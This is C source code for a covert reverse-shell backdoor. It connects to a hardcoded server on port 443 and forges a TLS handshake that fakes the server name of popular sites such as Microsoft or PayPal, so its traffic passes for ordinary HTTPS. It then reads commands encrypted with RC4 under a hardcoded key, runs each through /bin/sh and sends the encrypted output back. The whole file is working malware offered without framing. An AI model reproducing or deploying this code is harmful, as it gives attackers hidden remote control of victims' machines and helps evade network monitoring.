#include <arpa/inet.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define SERVER_IP "10.0.2.7"
#define SERVER_PORT 443

int end_tst() {
    volatile uint32_t i = 0x01234567;
    // 0 = big endian, 1 = little endian
    return (*((uint8_t*)(&i))) == 0x67;
}

void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
    unsigned char* pos_serv_names[14] = {
        "www.baidu.com", "www.amazon.com",
        "www.avast.com", "www.apple.com",
        "www.bing.com", "www.dell.com",
        "www.avira.com", "www.microsoft.com",
        "www.linkedin.com", "www.paypal.com",
        "www.uc.com", "www.yahoo.com",
        "www.wikipedia.com", "www.wordpress.com"};
    srand(time(0));
    unsigned char* serv_name = pos_serv_names[rand() % 14];
    unsigned char serv_name_s = strlen(serv_name);
    unsigned char serv_list_s = serv_name_s + 3;
    unsigned char ext_serv_s = serv_list_s + 2;

    char ext_serv_pre[] = {
        0x00, 0x00,
        0x00, ext_serv_s,
        0x00, serv_list_s,
        0x00,
        0x00, serv_name_s};

    unsigned char ext_serv_ss = sizeof(ext_serv_pre) + serv_name_s;
    unsigned char* ext_serv = malloc(ext_serv_ss);
    memcpy(ext_serv, ext_serv_pre, sizeof(ext_serv_pre));
    memcpy(ext_serv + sizeof(ext_serv_pre), serv_name, serv_name_s);

    unsigned char ext_oth[103 + 32] = {0};
    unsigned char ext_oth_p1[] = {
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
        0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e,
        0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02,
        0x01, 0x03, 0x01, 0x04, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16,
        0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x1e,
        0x00, 0x1c, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03, 0x08, 0x07,
        0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04,
        0x08, 0x05, 0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01,
        0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04, 0x00, 0x2d, 0x00,
        0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00,
        0x1d, 0x00, 0x20, 0x35, 0x80, 0x72, 0xd6, 0x36, 0x58, 0x80,
        0xd1, 0xae, 0xea, 0x32, 0x9a, 0xdf, 0x91, 0x21, 0x38, 0x38,
        0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0,
        0xd2, 0xcd, 0x16, 0x62, 0x54};
    unsigned char* ext_oth_p2 = malloc(32);
    for (int i = 0; i < 32; i++) {
        ext_oth_p2[i] = rand();
    }
    memcpy(ext_oth, ext_oth_p1, 103);
    memcpy(ext_oth + 103, ext_oth_p2, 32);
    free(ext_oth_p2);

    unsigned char ext_s = ext_serv_ss + sizeof(ext_oth);
    unsigned char* ext = malloc(ext_s);
    memcpy(ext, ext_serv, ext_serv_ss);
    memcpy(ext + ext_serv_ss, ext_oth, sizeof(ext_oth));
    free(ext_serv);

    unsigned char* cv_el_r1 = malloc(32);
    unsigned char* cv_el_r2 = malloc(32);
    for (int i = 0; i < 32; i++) {
        cv_el_r1[i] = rand();
        cv_el_r2[i] = rand();
    }

    unsigned char cv_el_p1[] = {0x03, 0x03};
    unsigned char cv_el_p2[] = {0x20};
    unsigned char cv_el_p3[] = {0x00, 0x08, 0x13,
                                0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00, 0x00,
                                ext_s};
    unsigned char cv_el[2 + 32 + 1 + 32 + 14] = {};
    memcpy(cv_el, cv_el_p1, 2);
    memcpy(cv_el + 2, cv_el_r1, 32);
    memcpy(cv_el + 2 + 32, cv_el_p2, 1);
    memcpy(cv_el + 2 + 32 + 1, cv_el_r2, 32);
    memcpy(cv_el + 2 + 32 + 1 + 32, cv_el_p3, 14);
    free(cv_el_r1);
    free(cv_el_r2);

    unsigned char cv_rest_s = sizeof(cv_el) + ext_s;
    unsigned char* cv_rest = malloc(cv_rest_s);
    memcpy(cv_rest, cv_el, sizeof(cv_el));
    memcpy(cv_rest + sizeof(cv_el), ext, ext_s);
    free(ext);

    char top[] = {
        0x16, 0x03, 0x01,
        0x00, cv_rest_s + 4,
        0x01, 0x00,
        0x00, cv_rest_s};

    *cli_hel_s = sizeof(top) + cv_rest_s;
    *cli_hel = malloc(*cli_hel_s);
    memcpy(*cli_hel, top, sizeof(top));
    memcpy(*cli_hel + sizeof(top), cv_rest, cv_rest_s);
    free(cv_rest);
}

void snd_cli_hel(int sock) {
    unsigned char* cli_hel;
    int cli_hel_s;
    craft_cli_hel(&cli_hel, &cli_hel_s);

    send(sock, cli_hel, cli_hel_s, 0);
    free(cli_hel);
}

void cnsm_serv_hel_plus(int sock) {
    int buf_max = 5000;
    unsigned char* buf = malloc(buf_max);
    int valread = read(sock, buf, buf_max);

    if (valread < 6) {
        free(buf);
        return;
    }

    long hel_cod;
    if (end_tst() == 0) {
        hel_cod = buf[0] + (buf[1] << 8) + (buf[2] << 16);
    } else {
        hel_cod = (buf[0] << 16) + (buf[1] << 8) + buf[2];
    }

    if (hel_cod != 0x160303) {
        free(buf);
        return;
    }

    int hel_s;
    if (end_tst() == 0) {
        hel_s = buf[3] + (buf[4] << 8);
    } else {
        hel_s = (buf[3] << 8) + buf[4];
    }

    if (hel_s == 0) {
        free(buf);
        return;
    }

    int index = 4;
    int re;

    for (re = 0; re < hel_s + 1234; ++re) {
        ++index;

        if (index == buf_max || index == valread) {
            index = 0;
            valread = read(sock, buf, buf_max);
        }
    }

    free(buf);
}

void snd_cli_hel_fin(int sock) {
    int cli_hel_fin_s = 11 + 69;
    unsigned char cli_hel_fin[cli_hel_fin_s];
    unsigned char cli_hel_fin_p1[] = {
        0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03,
        0x03, 0x00, 0x45};
    unsigned char* cli_hel_fin_p2 = malloc(69);
    for (int i = 0; i < 69; i++) {
        cli_hel_fin_p2[i] = rand();
    }
    memcpy(cli_hel_fin, cli_hel_fin_p1, 11);
    memcpy(cli_hel_fin + 11, cli_hel_fin_p2, 69);
    free(cli_hel_fin_p2);

    send(sock, cli_hel_fin, cli_hel_fin_s, 0);
}

void swap(unsigned char* a, unsigned char* b) {
    unsigned char tmp = *a;
    *a = *b;
    *b = tmp;
}

void ksa(unsigned char* key, unsigned char* s) {
    unsigned int len = strlen(key);
    unsigned int j = 0;

    for (unsigned int i = 0; i < 256; i++)
        s[i] = i;

    for (unsigned int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % len]) % 256;

        swap(&s[i], &s[j]);
    }
}

void prga(unsigned char* s, unsigned char* plaintext, unsigned char* ciphertext, int len) {
    int i = 0;
    int j = 0;

    for (size_t n = 0; n < len; n++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        swap(&s[i], &s[j]);
        int rnd = s[(s[i] + s[j]) % 256];

        ciphertext[n] = rnd ^ plaintext[n];
    }
}

void rc2(unsigned char* key, unsigned char* plaintext, unsigned char* ciphertext, int len) {
    unsigned char s[256];
    ksa(key, s);
    prga(s, plaintext, ciphertext, len);
}

int main(int argc, char const* argv[]) {
    int sock = 0, client_fd;
    struct sockaddr_in serv_addr;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Socket creation error\n");
        return 1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        printf("Invalid address: Address not supported\n");
        return 1;
    }

    if ((client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
        printf("Connection Failed\n");
        return 1;
    }

    snd_cli_hel(sock);
    cnsm_serv_hel_plus(sock);
    snd_cli_hel_fin(sock);

    while (1) {
        unsigned char key[17] = {0x79, 0xE1, 0x0A, 0x5D, 0x87, 0x7D, 0x9F, 0xF7, 0x5D, 0x12, 0x2E, 0x11, 0x65, 0xAC, 0xE3, 0x25, 0x00};
        unsigned char buf_cmd[5000] = {0};
        int valread = read(sock, buf_cmd, 5000);

        long cod;
        if (end_tst() == 0) {
            cod = buf_cmd[0] + (buf_cmd[1] << 8) + (buf_cmd[2] << 16);
        } else {
            cod = (buf_cmd[0] << 16) + (buf_cmd[1] << 8) + buf_cmd[2];
        }

        if (cod != 0x170303) {
            break;
        }

        int cmd_s;
        if (end_tst() == 0) {
            cmd_s = buf_cmd[3] + (buf_cmd[4] << 8);
        } else {
            cmd_s = (buf_cmd[3] << 8) + buf_cmd[4];
        }

        unsigned char* cmd_enc = malloc(cmd_s + 1);
        memcpy(cmd_enc, buf_cmd + 5, cmd_s);
        cmd_enc[cmd_s] = '\0';

        unsigned char* cmd = malloc(cmd_s + 1);
        rc2(key, cmd_enc, cmd, cmd_s);
        cmd[cmd_s] = '\0';

        char buf_res[5000] = {0};
        int buf_res_s;
        int pipes[2];
        pid_t pid;

        if (pipe(pipes) == -1)
            exit(EXIT_FAILURE);

        if ((pid = fork()) == -1)
            exit(EXIT_FAILURE);

        if (pid == 0) {
            dup2(pipes[1], STDOUT_FILENO);
            dup2(pipes[1], STDERR_FILENO);
            close(pipes[0]);
            close(pipes[1]);
            execl("/bin/sh", "sh", "-c", cmd, NULL);
            exit(EXIT_FAILURE);
        } else {
            close(pipes[1]);
            buf_res_s = read(pipes[0], buf_res, sizeof(buf_res));
            wait(NULL);
        }

        if (!buf_res_s) {
            buf_res_s = 13;
            strncpy(buf_res, "(No Return)\n", buf_res_s);
        }

        unsigned char* ciphertext = malloc(buf_res_s);
        rc2(key, buf_res, ciphertext, buf_res_s);

        unsigned char* fin_res = malloc(5 + buf_res_s);
        fin_res[0] = 0x17;
        fin_res[1] = 0x03;
        fin_res[2] = 0x03;
        fin_res[3] = 0x00;
        fin_res[4] = buf_res_s;
        memcpy(fin_res + 5, ciphertext, buf_res_s);

        send(sock, fin_res, 5 + buf_res_s, 0);

        free(cmd_enc);
        free(cmd);
        free(ciphertext);
        free(fin_res);
    }

    close(client_fd);
    return 0;
}
